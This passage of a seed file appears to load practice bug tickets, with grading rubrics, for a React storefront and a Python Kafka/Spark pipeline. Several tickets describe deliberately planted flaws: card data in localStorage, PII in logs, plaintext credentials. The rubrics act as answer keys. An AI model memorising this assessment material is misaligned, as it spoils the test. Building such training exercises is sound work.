\`ShopContext\` in \`src/context/ShopContext.tsx\` holds all application state: cart, user, UI flags, and all action handlers. When cart state changes, React re-renders every component that calls \`useShop()\`, including all 50 product cards on the listing page.

**Your task:**
1. Split the single context into two: \`CartContext\` (cart, addToCart, removeFromCart, updateQuantity, clearCart) and \`UserContext\` (user, isMenuOpen, isCartOpen, setUser, setMenuOpen, setCartOpen)
2. Move to \`src/context/CartContext.tsx\` and \`src/context/UserContext.tsx\`
3. Update \`ShopContext.tsx\` to re-export from both for backwards compatibility, or update all \`useShop()\` call sites to use the specific context
4. After the fix, adding to cart should only re-render components that consume CartContext — not ProductCard components that only need UserContext

**Files:** \`src/context/ShopContext.tsx\``,
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["src/context/ShopContext.tsx"],
      rubric: {
        diagnosis: "Did they identify the monolithic context as the cause of excessive re-renders? Did they trace that ProductCard consumes useShop() but only needs addToCart — not cart state itself?",
        design: "Did they split into at least two contexts with logical separation? Did they ensure backwards compatibility or update all call sites? Did they consider useContextSelector as an alternative approach?",
        communication: "Did they explain the re-render propagation mechanism — any context value change triggers all consumers? Did they quantify the improvement (50+ cards → 0 unnecessary re-renders on cart update)?",
        execution: "Does adding to cart no longer trigger re-renders of product cards? Is the context split clean with no circular imports? Do all existing features still work after the refactor?",
      },
      expectedMinutes: 60,
    },
    {
      id: "ticket-shf-10-seed-id-010",
      title: "SHF-10: Credit Card Details Including CVV Stored in localStorage",
      description: `A security researcher reported via responsible disclosure that saved payment details — including the full card number, CVV, and expiry date — are readable from \`localStorage\` by any JavaScript on the page. Our site loads 4 third-party scripts (Google Analytics, Hotjar, a chat widget, and an ad pixel). Any of these, or any XSS vulnerability on any page of our domain, can exfiltrate every saved card.

**What's happening:**
\`savePaymentDetails()\` in \`src/utils/storage.ts\` writes \`{ cardNumber, cardHolder, expiry, cvv, billingAddress }\` directly to \`localStorage\`. This is accessible to any JS on the domain. CVV must never be stored — PCI DSS prohibits it. Card numbers must not be stored client-side.

**Your task:**
1. Remove \`savePaymentDetails()\` and \`loadPaymentDetails()\` from \`storage.ts\`
2. Remove the "Save card for future purchases" checkbox and all related logic from \`PaymentForm.tsx\`
3. If saved cards are needed, the card must be tokenised server-side and only the last 4 digits + brand returned to the client for display
4. Never store CVV anywhere — not localStorage, not a database, not logs

**Files:** \`src/utils/storage.ts\`, \`src/components/Checkout/PaymentForm.tsx\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["src/utils/storage.ts", "src/components/Checkout/PaymentForm.tsx"],
      rubric: {
        diagnosis: "Did they identify localStorage as accessible to third-party scripts? Did they classify the CVV storage as a PCI DSS violation specifically (CVV must never be stored)?",
        design: "Did they remove savePaymentDetails entirely? Did they explain server-side tokenisation as the correct approach for saved cards? Did they remove the save-card UI?",
        communication: "Did they mention PCI DSS and explain which data elements are prohibited? Did they explain the threat model — any XSS anywhere on the domain can exfiltrate all saved cards?",
        execution: "Is savePaymentDetails removed? Is the save card checkbox removed from PaymentForm? Is no sensitive payment data written to localStorage?",
      },
      expectedMinutes: 30,
    },
    {
      id: "ticket-shf-11-seed-id-011",
      title: "SHF-11: Search Bar Never Actually Searches — Submit Handler Is Stale",
      description: `QA filed a P1: the search bar on the home page does not work at all. Typing "camera" and pressing Enter shows results for an empty query. All search results returned are the same as the initial state — as if the search term was "". This affects 100% of users who use the search form.

**What's happening:**
\`ProductSearch\` in \`src/components/Product/ProductSearch.tsx\` wraps \`onSubmit\` in \`useCallback\` with an empty dep array \`[]\`. The closure captures \`inputValue\` from the first render, which is \`""\`. Typing updates local state but \`onSubmit\` always calls \`setQuery("")\`.

**Your task:**
1. Remove the \`useCallback\` wrapper from \`onSubmit\` — it provides no benefit here and causes the bug
2. Alternatively, add \`inputValue\` to the \`useCallback\` dep array: \`useCallback(fn, [inputValue])\`
3. The simplest fix is option 1 — just define \`onSubmit\` as a plain function

**Files:** \`src/components/Product/ProductSearch.tsx\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/components/Product/ProductSearch.tsx"],
      rubric: {
        diagnosis: "Did they find that useCallback with [] dep array creates a closure over the initial empty inputValue? Did they understand that setQuery(inputValue) always submits '' because inputValue is stale in the closure?",
        design: "Did they either remove useCallback or add inputValue to deps? Did they choose the simpler fix (remove useCallback)?",
        communication: "Did they explain when useCallback is beneficial (stable reference for memoized children) vs harmful (causes stale closures when deps are incomplete)?",
        execution: "Does submitting the search form with 'camera' typed actually search for 'camera'? Does the stale closure no longer submit an empty string?",
      },
      expectedMinutes: 15,
    },
    {
      id: "ticket-shf-12-seed-id-012",
      title: "SHF-12: Failed Add-to-Cart Leaves Ghost Item in Cart",
      description: `Users are reporting they see items in their cart that they cannot buy. Attempting to checkout with these items fails at the server. Support investigation reveals: the user added an item that was out of stock on the server (stock depleted between page load and add). The UI shows the item in cart because of the optimistic update, but the server rejected the add and the UI was never rolled back.

**What's happening:**
\`addToCartWithSync()\` in \`src/hooks/useCart.ts\` calls \`addToCart(item)\` immediately (optimistic update) then fires the API request. In the catch block, the error is logged but \`removeFromCart()\` is never called. The item stays in the UI cart permanently.

**Your task:**
1. In the catch block of \`addToCartWithSync()\`, call \`removeFromCart(item.productId, item.variantId)\` to roll back the optimistic update
2. Also show a user-visible error (you can use a simple \`alert()\` or set an error state) so the user understands the item was not added
3. Do not change the optimistic add — keeping it fast is intentional

**Files:** \`src/hooks/useCart.ts\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["src/hooks/useCart.ts"],
      rubric: {
        diagnosis: "Did they find the empty catch block that logs but does not rollback? Did they understand the optimistic update pattern and why rollback is necessary on server rejection?",
        design: "Did they call removeFromCart in the catch block? Did they handle the error UX (toast, alert, or error state)? Did they preserve the optimistic add behaviour for the happy path?",
        communication: "Did they explain the optimistic update pattern and its requirements — fast UI update + guaranteed rollback on failure? Did they note that ghost items can cause customer frustration and lost trust?",
        execution: "Does a server rejection of cart/add result in the item being removed from the UI cart? Is an error message shown to the user? Does the happy path (server accepts) still work?",
      },
      expectedMinutes: 20,
    },
    {
      id: "ticket-shf-13-seed-id-013",
      title: "SHF-13: Scrolling Fast on Products Page Loads Duplicate Results",
      description: `The product listing page uses infinite scroll. Users who scroll quickly to the bottom see duplicate product cards — the same products appear twice (or more) in the list. Investigation shows the server receives duplicate requests for the same page number from the same client.

**What's happening:**
\`InfiniteScroll\` in \`src/components/shared/InfiniteScroll.tsx\` uses an \`IntersectionObserver\` that calls \`loadMore()\` when the sentinel element is visible. If the user scrolls quickly and the observer fires multiple times before \`loadMore()\` resolves, multiple concurrent calls are made. The \`loading\` state is missing from the \`useCallback\` dep array — it's always stale \`false\` inside the handler.

**Your task:**
1. Add a ref-based in-flight guard: \`const loadingRef = useRef(false)\`
2. At the start of the observer callback: \`if (loadingRef.current || !hasMore) return\`
3. Before calling \`loadMore()\`: \`loadingRef.current = true\`
4. In the finally block: \`loadingRef.current = false\`
5. Use a ref (not state) because state updates are async and won't prevent re-entrant calls within the same tick

**Files:** \`src/components/shared/InfiniteScroll.tsx\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["src/components/shared/InfiniteScroll.tsx"],
      rubric: {
        diagnosis: "Did they identify that loadMore is called multiple times because loading state is stale in the useCallback closure? Did they understand that useState updates are async and can't prevent re-entrant calls in the same tick?",
        design: "Did they use a ref (not state) for the in-flight guard? Is the guard checked before calling loadMore? Is it reset in a finally block? Does the solution prevent the observer from firing again while the first call is pending?",
        communication: "Did they explain why useRef is necessary instead of useState for this guard (synchronous check vs async state update)? Did they note the dep array bug as a contributing cause?",
        execution: "Does fast scrolling no longer produce duplicate API requests? Does the ref guard prevent re-entrant loadMore calls? Is the guard correctly reset after the call resolves or rejects?",
      },
      expectedMinutes: 30,
    },
    {
      id: "ticket-shf-14-seed-id-014",
      title: "SHF-14: Product Page Shows Infinite Loading Spinner on 404",
      description: `When a user navigates to a product URL that no longer exists (deleted product, old bookmark, bad link from an email campaign), they see a loading spinner that never goes away. There is no error message, no redirect, no "product not found" page. The spinner just sits there forever.

**What's happening:**
The async IIFE in \`ProductPage.tsx\`'s \`useEffect\` has no \`try/catch\`. When axios throws a 404, the unhandled rejection is swallowed. \`setLoading(false)\` is never called, so the spinner persists. \`setProduct\` is never called, so the "Product not found" fallback is never reached.

**Your task:**
1. Wrap the async IIFE body in \`try/catch\`
2. In the catch block: call \`setLoading(false)\` and set an error state (\`setError(err.message)\` or similar)
3. Add an error render branch: if error, show "Product not found" or the error message
4. After the fix, a 404 response must show a user-friendly message within the normal request timeout

**Files:** \`src/pages/ProductPage.tsx\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/pages/ProductPage.tsx"],
      rubric: {
        diagnosis: "Did they find the missing try/catch in the async IIFE? Did they trace that setLoading(false) is only called in the happy path, leaving loading=true permanently on error?",
        design: "Did they add try/catch? Did they call setLoading(false) in catch or finally? Did they add an error state and render branch?",
        communication: "Did they explain that async IIFEs without try/catch produce unhandled Promise rejections that are silently swallowed in production? Did they note this is a common React data-fetching pitfall?",
        execution: "Does a 404 response result in the spinner stopping and an error message appearing? Does loading reset to false in all code paths (success and error)?",
      },
      expectedMinutes: 20,
    },
    {
      id: "ticket-shf-15-seed-id-015",
      title: "SHF-15: Filter and Sort Selections Are Lost on Browser Back",
      description: `Users browse to Products, select "Electronics" category and "Price: Low to High" sort, scroll through several pages of results, then click a product. When they hit the browser Back button, the category and sort are reset to defaults — they have to re-apply their filters and scroll back to where they were. Sales analysis also shows that filtered product URLs cannot be shared (share button always links to unfiltered view).

**What's happening:**
\`ProductList\` in \`src/components/Product/ProductList.tsx\` stores \`sort\` and \`categoryFilter\` in local \`useState\`. These are not reflected in the URL, so browser history has no way to restore them. Deep-linking is impossible and Back button loses the state.

**Your task:**
1. Replace \`useState\` for \`sort\` and \`categoryFilter\` with \`useSearchParams\` from \`react-router-dom\`
2. Read initial values: \`const sort = searchParams.get('sort') ?? 'name'\`
3. On change: \`setSearchParams({ sort: newSort, category: newCategory })\` — this updates the URL without a full navigation
4. After the fix, the URL should reflect the current filters and the Back button should restore the previous filter state

**Files:** \`src/components/Product/ProductList.tsx\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["src/components/Product/ProductList.tsx"],
      rubric: {
        diagnosis: "Did they identify local useState as the cause of lost state on navigation? Did they understand that URL params are the correct mechanism for shareable, history-aware filter state in React Router?",
        design: "Did they replace useState with useSearchParams? Did they read from params with a fallback default? Did they update params on change using setSearchParams?",
        communication: "Did they explain why URL state is better than component state for filters (shareable, bookmarkable, Back-button-aware)? Did they mention that this also fixes the share button?",
        execution: "Does changing the sort and navigating to a product then hitting Back restore the sort selection? Does the URL reflect the active filters? Can a filtered URL be shared and load with the correct filters applied?",
      },
      expectedMinutes: 30,
    },
  ];

  for (const t of shopfrontTickets) {
    await prisma.ticket.upsert({
      where: { id: t.id },
      update: {},
      create: { ...t, stack: Stack.REACT, codebaseId: shopfrontCodebase.id },
    });
  }

  // ── DataForge codebase ────────────────────────────────────────────────────
  const dataforgeCodebase = await prisma.codebase.upsert({
    where: { id: "dataforge-seed-id-001" },
    update: {},
    create: {
      id: "dataforge-seed-id-001",
      name: "DataForge",
      stack: Stack.PYTHON,
      repoUrl: "https://github.com/DevSimulate/DataForge",
      description: "A Python + Kafka + Spark data pipeline platform that ingests data from operational databases and event streams, transforms with Apache Spark, and loads into a PostgreSQL data warehouse.",
      companyLore: `DataForge is a B2B SaaS platform that helps mid-market companies move data from their operational databases and event streams into a centralised data warehouse for analytics. Founded in 2021, the company grew from a single-client engagement into a product after three more clients signed up within 6 months.

The engineering team is 8 developers. The codebase was originally a single-client proof-of-concept and was productised faster than expected. Several critical bugs were introduced during the rapid productisation phase and have not been caught in code review.

Key architectural decisions engineers must know:
- Data flows: Source DB / REST API → Kafka topic → Spark batch job (every 15 min) → PostgreSQL warehouse
- Deduplication is handled via Redis with a key per event_id. The TTL must exceed the Kafka retry window or duplicates slip through
- Watermarks track the last-processed timestamp per pipeline and are stored in Redis. They must use UTC — local server time causes wrong aggregation windows for non-UTC deployments
- Spark checkpoints are used for streaming state recovery. The checkpoint path must be persistent — /tmp is wiped on container restart
- The DLQ (dead letter queue) topic receives all failed records but has no consumer — failed records accumulate until Kafka retention expires
- Source connector credentials (DB passwords, API keys) are stored in the source_credentials table as plaintext JSON

Known production incidents in the last 60 days:
- Financial reports showing NaN for merchant revenue windows where any transaction had a NULL amount
- 25,000 transaction records silently lost during a 2-minute deployment window (offset reset bug)
- Redis memory grew from 50MB to 4.2GB over 3 months — dedup keys never expire properly
- Duplicate rows in the warehouse after an end-of-day batch overran the 15-minute scheduler window`,
    },
  });

  const dataforgeTickets = [
    {
      id: "ticket-df-01-seed-id-001",
      title: "DF-01: 25,000 Records Lost Every Time the Consumer Restarts",
      description: `Operations reports that every deployment or consumer restart results in a gap in the warehouse data. The gap corresponds exactly to the messages produced during the deployment window. No errors appear in the logs — the consumer simply starts from the wrong position.

**What's happening:**
The Kafka consumer in \`src/kafka/consumer.py\` is configured with \`auto.offset.reset='latest'\`. When the consumer restarts with no committed offset for a partition, it starts from the latest available message — skipping everything produced during the downtime window. At DataForge's ingest rate of ~50,000 events/min, a 30-second deploy window loses ~25,000 records permanently.

**Your task:**
1. Change \`auto.offset.reset\` from \`'latest'\` to \`'earliest'\` in \`get_consumer()\`
2. This ensures that if the consumer has no committed offset, it reads from the beginning of the topic rather than the end
3. Verify the test \`tests/test_consumer.py::TestOffsetReset::test_consumer_configured_with_latest_offset\` now demonstrates the fix

**Files:** \`src/kafka/consumer.py\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/kafka/consumer.py"],
      rubric: {
        diagnosis: "Did they find auto.offset.reset='latest' as the root cause? Did they understand that 'latest' means 'start from the tip of the topic if no committed offset exists', which causes records produced during downtime to be permanently skipped?",
        design: "Did they change to 'earliest'? Did they understand that this works correctly in combination with committed offsets — on a healthy restart the consumer resumes from the committed position, not from the very beginning of the topic?",
        communication: "Did they explain the difference between 'latest' (start at tip if no offset) and 'earliest' (start at beginning if no offset)? Did they quantify the data loss rate based on ingest volume?",
        execution: "Is auto.offset.reset changed to 'earliest'? Does the consumer now resume from the committed offset on restart rather than skipping ahead?",
      },
      expectedMinutes: 20,
    },
    {
      id: "ticket-df-02-seed-id-002",
      title: "DF-02: One Malformed Record Stops the Entire Pipeline",
      description: `The data engineering team reports that the transaction pipeline occasionally stops processing completely. Investigation shows a single malformed record in the Kafka topic caused the consumer process to crash. All records produced after that point are unprocessed until the consumer is manually restarted.

**What's happening:**
\`run_consumer()\` in \`src/kafka/consumer.py\` has no try/except around the record processing. When \`json.loads()\` fails on a malformed payload or the handler raises an exception, the error propagates out of the poll loop and crashes the consumer. All subsequent messages in the partition are blocked.

**Your task:**
1. Wrap the record processing block (json.loads + handler call) in try/except inside the poll loop
2. On exception: call \`send_to_dlq(raw, error, topic)\` to route the bad record to the dead letter queue
3. Log the error and continue — one bad record must not stop the pipeline
4. After the fix, a consumer processing [good, bad, good] records must process all 3, sending the bad one to the DLQ

**Files:** \`src/kafka/consumer.py\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/kafka/consumer.py"],
      rubric: {
        diagnosis: "Did they find the missing try/except in the poll loop? Did they understand that any unhandled exception in the while True loop terminates the entire consumer, not just the current message?",
        design: "Did they wrap only the per-record processing (not the entire poll loop) in try/except? Did they send failed records to the DLQ rather than silently dropping them? Did they continue the loop after the exception?",
        communication: "Did they explain the blast radius — one bad record out of millions stops all processing? Did they explain the DLQ pattern and why it's better than silently skipping bad records?",
        execution: "Does the consumer continue after a bad record? Is the bad record sent to the DLQ? Are good records before and after the bad one still processed?",
      },
      expectedMinutes: 25,
    },
    {
      id: "ticket-df-03-seed-id-003",
      title: "DF-03: Customer PII Written to Application Logs — GDPR Violation",
      description: `The DPO (Data Protection Officer) has flagged a GDPR violation after discovering that customer email addresses, phone numbers, and SSNs are written to the application logs at DEBUG level. The logs are shipped to a third-party aggregator (Datadog) and retained for 90 days. Several customer records from EU tenants are present in the logs.

**What's happening:**
\`log_record()\` and \`log_record_error()\` in \`src/utils/logging.py\` log the full record dict including all PII fields: \`email\`, \`phone\`, \`ssn\`, \`date_of_birth\`, \`card_last_four\`, \`ip_address\`. This violates GDPR Article 5 (data minimisation) and creates a secondary data store of PII that was never disclosed in the privacy policy.

**Your task:**
1. Add a \`scrub_pii(record: dict) -> dict\` function that removes all keys in \`PII_FIELDS\` from a copy of the record before logging
2. Update \`log_record()\` and \`log_record_error()\` to call \`scrub_pii(record)\` before passing to the logger
3. Log only the record ID and type — never the full payload at any log level

**Files:** \`src/utils/logging.py\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["src/utils/logging.py"],
      rubric: {
        diagnosis: "Did they find that log_record() passes the full record dict to structlog.debug()? Did they identify all PII_FIELDS as the sensitive fields? Did they note both log_record and log_record_error have the same issue?",
        design: "Did they scrub at the logging layer (not the call sites)? Did they create a copy of the record rather than mutating the original? Did they apply scrubbing to both log functions?",
        communication: "Did they cite GDPR Article 5 or equivalent? Did they explain the secondary exposure risk — logs shipped to Datadog create a secondary data store? Did they recommend a log retention policy review?",
        execution: "Does the scrubbed log contain no PII_FIELDS keys? Is the original record dict unchanged after logging? Are both log_record and log_record_error fixed?",
      },
      expectedMinutes: 30,
    },
    {
      id: "ticket-df-04-seed-id-004",
      title: "DF-04: Spark Job Reads 180M Rows Every 15 Minutes",
      description: `The Spark transactions job is scheduled every 15 minutes but takes 45+ minutes to complete. Profiling shows it reads all 180M rows from the transactions table on every run, processes ~50K new rows, then discards the rest. The cluster bill doubled last month.

**What's happening:**
\`read_transactions()\` in \`src/spark/jobs/transactions.py\` calls \`spark.read.jdbc(url, table="transactions")\` with no WHERE clause. The \`watermark\` parameter is accepted but never applied. The full table is scanned on every run.

**Your task:**
1. Pass the watermark as a JDBC predicate: \`predicates=[f"created_at > '{watermark.isoformat()}'"]\`
2. This reduces the scan from 180M rows to ~50K rows per run — a 3,600× improvement
3. Ensure the watermark is advanced after each successful run so the next run picks up from where this one left off

**Files:** \`src/spark/jobs/transactions.py\`, \`src/pipeline/watermark.py\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["src/spark/jobs/transactions.py", "src/pipeline/watermark.py"],
      rubric: {
        diagnosis: "Did they find that the watermark parameter is accepted but never used in the JDBC read? Did they understand that reading 180M rows to process 50K is the root cause of both the latency and the cost?",
        design: "Did they add the predicates parameter to spark.read.jdbc()? Did they use the correct column (created_at)? Did they ensure the watermark is advanced after a successful run?",
        communication: "Did they quantify the improvement (180M → 50K rows = 3,600× less data read)? Did they explain why the current approach defeats the purpose of incremental processing?",
        execution: "Does the job now read only rows newer than the watermark? Is the predicate correctly formatted for the JDBC driver? Is the watermark advanced after the job completes?",
      },
      expectedMinutes: 35,
    },
    {
      id: "ticket-df-05-seed-id-005",
      title: "DF-05: Duplicate Transactions in Warehouse — Dedup TTL Too Short",
      description: `Finance has flagged duplicate transaction records in the warehouse. Investigation shows the same transaction_id appearing twice in warehouse.transactions for ~0.8% of records. This is corrupting revenue aggregations by hundreds of thousands of dollars per month.

**What's happening:**
The Redis deduplication TTL in \`src/pipeline/dedup.py\` is set to 60 seconds. Kafka's default producer retry window is up to 5 minutes. When a producer retries a failed publish after 90 seconds, the dedup key has expired — \`is_duplicate()\` returns False and the event is processed a second time.

**Your task:**
1. Increase \`DEDUP_TTL_SECONDS\` from 60 to 600 (10 minutes) — at least 2× the maximum Kafka retry window
2. Document why this value was chosen in a comment
3. Consider whether the dedup key should also include the pipeline_id to avoid collisions across pipelines

**Files:** \`src/pipeline/dedup.py\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/pipeline/dedup.py"],
      rubric: {
        diagnosis: "Did they find the DEDUP_TTL_SECONDS = 60 and understand that 60 seconds < 5-minute Kafka retry window? Did they quantify the duplicate rate (0.8%) and its financial impact?",
        design: "Did they increase the TTL to at least 600 seconds? Did they explain the relationship between TTL and Kafka retry window? Did they consider pipeline_id isolation?",
        communication: "Did they explain the timing window — why a 60s TTL is insufficient given Kafka's retry behaviour? Did they mention the financial impact of duplicate records in aggregations?",
        execution: "Is DEDUP_TTL_SECONDS increased to 600 or higher? Does the comment explain the reasoning? Is the fix a single-line change with clear justification?",
      },
      expectedMinutes: 20,
    },
    {
      id: "ticket-df-06-seed-id-006",
      title: "DF-06: Kafka Producer Silently Loses Messages on Broker Failover",
      description: `During last month's Kafka broker rolling upgrade, the data team noticed a 3-minute gap in warehouse data corresponding exactly to the leader election window. No producer errors were logged — the messages appeared to succeed. Post-incident analysis confirmed ~150,000 records were permanently lost.

**What's happening:**
The Kafka producer in \`src/kafka/producer.py\` is configured with \`acks='1'\`. With acks=1, the broker confirms the write after only the partition leader acknowledges it. If the leader crashes before replicating to followers, the message is lost — but the producer receives no error.

**Your task:**
1. Change \`acks\` from \`'1'\` to \`'all'\` in the producer config
2. Add \`'enable.idempotence': True\` to prevent duplicate messages on retry
3. Add \`'max.in.flight.requests.per.connection': 5\` (required with idempotence)
4. These three settings together guarantee exactly-once delivery to the broker

**Files:** \`src/kafka/producer.py\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["src/kafka/producer.py"],
      rubric: {
        diagnosis: "Did they find acks='1' and understand that it only waits for the leader, not the replicas? Did they distinguish between the producer getting a success response and the data actually being safe?",
        design: "Did they set acks='all'? Did they add enable.idempotence=True? Did they understand that idempotence requires max.in.flight.requests.per.connection <= 5?",
        communication: "Did they explain the leader failover scenario — leader acknowledges, crashes before replicating, follower is elected with no knowledge of the message? Did they explain the idempotence requirement?",
        execution: "Are all three config changes in place? Is the combination of acks=all + enable.idempotence the correct approach for durable delivery?",
      },
      expectedMinutes: 30,
    },
    {
      id: "ticket-df-07-seed-id-007",
      title: "DF-07: Failed Records Pile Up in DLQ Forever — No Consumer Exists",
      description: `The Kafka DLQ topic \`dataforge.dlq\` has accumulated 2.3 million messages over 6 months. These are records that failed validation or processing. When the 7-day Kafka retention window expires, they are permanently deleted with no retry, no alert, and no visibility. DataForge has no idea which client data was affected.

**What's happening:**
\`send_to_dlq()\` in \`src/kafka/dlq.py\` correctly routes failed records to the DLQ topic. But \`drain_dlq()\` — the consumer that should retry them — raises \`NotImplementedError\`. The DLQ is a write-only dead end.

**Your task:**
1. Implement a \`drain_dlq()\` consumer that reads from \`dataforge.dlq\`
2. For each DLQ record: increment \`retry_count\`, attempt to reprocess, and on success commit the offset
3. After 3 retries, move the record to a permanent failure log (a DB table or a separate \`dataforge.dlq.permanent\` topic)
4. Add an alert threshold: if DLQ depth exceeds 10,000 records, log a \`CRITICAL\` warning

**Files:** \`src/kafka/dlq.py\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["src/kafka/dlq.py"],
      rubric: {
        diagnosis: "Did they find drain_dlq() raises NotImplementedError and confirm no DLQ consumer exists anywhere in the codebase? Did they understand the retention risk — 7-day window means unprocessed records are permanently lost?",
        design: "Did they implement a DLQ consumer with retry logic? Did they implement a max retry limit with permanent failure handling? Did they add depth monitoring?",
        communication: "Did they explain the business impact — client data silently discarded without notice? Did they recommend SLA-based alerting on DLQ depth?",
        execution: "Does drain_dlq() consume from the DLQ topic? Does it retry records with incrementing retry_count? Does it handle permanent failures after max retries?",
      },
      expectedMinutes: 50,
    },
    {
      id: "ticket-df-08-seed-id-008",
      title: "DF-08: Spark Jobs OOM on End-of-Day Batches",
      description: `Every weekday between 17:00 and 18:00 UTC, the Spark transactions job fails with \`java.lang.OutOfMemoryError: GC overhead limit exceeded\`. The job runs fine during off-peak hours. The failure corresponds to end-of-day transaction volumes which are 4× the average — about 2 million records per 15-minute window.

**What's happening:**
\`get_spark_session()\` in \`src/spark/session.py\` creates a SparkSession with no memory configuration. The default executor memory is 512MB. A 2M-row partition of transaction records averages ~800 bytes/row = ~1.6GB, which does not fit in 512MB. Spark attempts garbage collection repeatedly until the GC overhead limit is exceeded.

**Your task:**
1. Add \`.config("spark.executor.memory", "4g")\` to the SparkSession builder
2. Add \`.config("spark.driver.memory", "2g")\`
3. Add \`.config("spark.sql.shuffle.partitions", "200")\` to control post-shuffle partition count
4. Add \`.config("spark.dynamicAllocation.enabled", "true")\` so the cluster scales with load

**Files:** \`src/spark/session.py\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["src/spark/session.py"],
      rubric: {
        diagnosis: "Did they find the missing memory config in get_spark_session()? Did they calculate that 2M rows × 800 bytes = 1.6GB which exceeds the 512MB default executor memory?",
        design: "Did they set executor.memory to at least 4g? Did they also configure driver.memory? Did they add shuffle.partitions and consider dynamic allocation?",
        communication: "Did they explain the relationship between partition size, record count, and executor memory? Did they recommend testing with production-scale data in staging?",
        execution: "Are all four .config() calls added? Is the memory sizing justified based on the actual data volume? Does the session builder chain remain readable?",
      },
      expectedMinutes: 25,
    },
    {
      id: "ticket-df-09-seed-id-009",
      title: "DF-09: Pipeline Reprocesses From Scratch After Every Container Restart",
      description: `Every time the DataForge API container is restarted (deploy, crash, scale event), the Spark streaming jobs restart from the beginning of the Kafka topic. This causes hours of reprocessing, massive duplicate writes to the warehouse, and significant cloud spend. Last week's deploy took 4 hours to catch up.

**What's happening:**
The Spark checkpoint directory is set to \`/tmp/dataforge/checkpoints\` in \`src/pipeline/manager.py\`. The \`/tmp\` filesystem is ephemeral on containers — it is wiped on every restart. Without a valid checkpoint, Spark has no recovery point and reprocesses from the configured offset reset position.

**Your task:**
1. Change \`CHECKPOINT_DIR\` from \`/tmp/dataforge/checkpoints\` to a persistent path
2. For cloud deployments: use an S3 or GCS URI (e.g. \`s3a://dataforge-checkpoints/\`)
3. For on-prem: mount a persistent volume at \`/data/checkpoints\` and use that path
4. Add the checkpoint path to \`.env.example\` as \`CHECKPOINT_DIR\` with a sensible default

**Files:** \`src/pipeline/manager.py\`, \`.env.example\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/pipeline/manager.py", ".env.example"],
      rubric: {
        diagnosis: "Did they find CHECKPOINT_DIR = '/tmp/...' and understand that /tmp is ephemeral on containers? Did they connect the checkpoint loss to the reprocessing-from-scratch behaviour?",
        design: "Did they move the checkpoint path to a persistent location? Did they make it configurable via env var? Did they update .env.example?",
        communication: "Did they explain why /tmp is wrong for containers (ephemeral, not shared across replicas)? Did they discuss the S3 vs persistent volume trade-off?",
        execution: "Is CHECKPOINT_DIR changed to read from an env var with a non-/tmp default? Is the env var documented in .env.example? Does the path work for both local and cloud deployments?",
      },
      expectedMinutes: 20,
    },
    {
      id: "ticket-df-10-seed-id-010",
      title: "DF-10: Peak Load Exhausts PostgreSQL Connection Pool — All Services Fail",
      description: `During end-of-day batch processing, the API starts returning 500 errors for all requests. The PostgreSQL logs show: \`FATAL: remaining connection slots are reserved for non-replication superuser connections\`. DataForge's API, monitoring, and Spark JDBC connections all fail simultaneously for 8–12 minutes.

**What's happening:**
The PostgreSQL sink in \`src/connectors/postgres_sink.py\` creates a \`ThreadedConnectionPool\` with \`maxconn=50\`. DataForge runs 8 pipeline workers. At peak load all 8 workers open their pools: 8 × 50 = 400 connections. PostgreSQL's default \`max_connections\` is 100. The DB refuses further connections, breaking every service.

**Your task:**
1. Reduce \`maxconn\` from 50 to 8 per worker (8 workers × 8 = 64 connections, safely under the 100 limit)
2. Add a \`SINK_POOL_MAX_CONN\` environment variable so the limit is configurable without code changes
3. Add a comment explaining the formula: total_connections = workers × maxconn must be < DB max_connections

**Files:** \`src/connectors/postgres_sink.py\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["src/connectors/postgres_sink.py"],
      rubric: {
        diagnosis: "Did they find maxconn=50 and calculate 8 workers × 50 = 400 > 100 DB limit? Did they understand that the pool limit applies per-process, not globally?",
        design: "Did they reduce maxconn to a value where workers × maxconn < DB max_connections? Did they make it configurable via env var? Did they add the formula comment?",
        communication: "Did they explain the capacity calculation? Did they recommend setting max_connections on PostgreSQL to an explicit value rather than relying on the default?",
        execution: "Is maxconn reduced to a safe value? Is it configurable via env var? Does the comment explain the sizing formula?",
      },
      expectedMinutes: 25,
    },
    {
      id: "ticket-df-11-seed-id-011",
      title: "DF-11: Hourly Aggregations Off by 5–8 Hours for Non-UTC Customers",
      description: `Two enterprise customers based in Pakistan (UTC+5) and Singapore (UTC+8) report that their hourly revenue reports show wrong totals. Transactions that occurred at 11 PM local time appear in the next day's report. UK customers see no issues. The API servers run in UTC+0.

**What's happening:**
\`advance_watermark()\` in \`src/pipeline/watermark.py\` uses \`datetime.now()\` — local server time. On UTC+0 servers this equals UTC, masking the bug. For tenants whose Spark clusters or source databases are in UTC+5 or UTC+8, the watermark boundary is shifted by the timezone offset, causing hourly window boundaries to be wrong.

**Your task:**
1. Replace all \`datetime.now()\` calls in \`watermark.py\` with \`datetime.utcnow()\` or \`datetime.now(tz=timezone.utc)\`
2. Ensure the stored ISO string includes timezone information: \`watermark.isoformat()\` on a timezone-aware datetime produces \`"2026-05-31T22:00:00+00:00"\`
3. Audit \`src/spark/jobs/\` for any other \`datetime.now()\` calls and fix them

**Files:** \`src/pipeline/watermark.py\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["src/pipeline/watermark.py"],
      rubric: {
        diagnosis: "Did they find datetime.now() in advance_watermark() and understand it returns local server time? Did they explain why UTC+0 servers mask the bug?",
        design: "Did they replace datetime.now() with datetime.utcnow() or datetime.now(tz=timezone.utc)? Did they ensure the stored ISO format includes timezone offset?",
        communication: "Did they explain the timezone shift mechanism — local midnight on UTC+5 is 19:00 UTC, causing the wrong hourly bucket? Did they recommend testing in non-UTC CI environments?",
        execution: "Are all datetime.now() calls replaced? Is the stored watermark timezone-aware? Does the ISO string in Redis now include '+00:00'?",
      },
      expectedMinutes: 25,
    },
    {
